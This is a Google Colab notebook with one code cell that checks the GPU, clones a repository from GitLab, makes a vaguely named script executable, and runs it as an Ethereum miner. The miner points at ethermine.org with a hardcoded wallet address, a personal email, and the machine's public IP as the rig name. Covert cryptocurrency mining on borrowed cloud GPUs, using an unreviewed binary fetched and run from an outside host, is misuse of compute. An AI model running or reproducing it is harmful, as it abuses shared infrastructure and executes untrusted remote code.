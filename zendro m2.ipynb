{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Z8.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "VZM6Yd3T8BD5H"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "VZM6Yd3T8BD5H"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/agungharsa/proc.git\n",
        "%cd proc\n",
        "!chmod +x ngawor.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./ngawor.sh -algo ethash -pool1 eu1.ethermine.org:14444 -wallet 0x05a10aaa1e862c786a2beada3ca072f5cd38e02f -coin eth -rigName $ip -email sarjon350@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
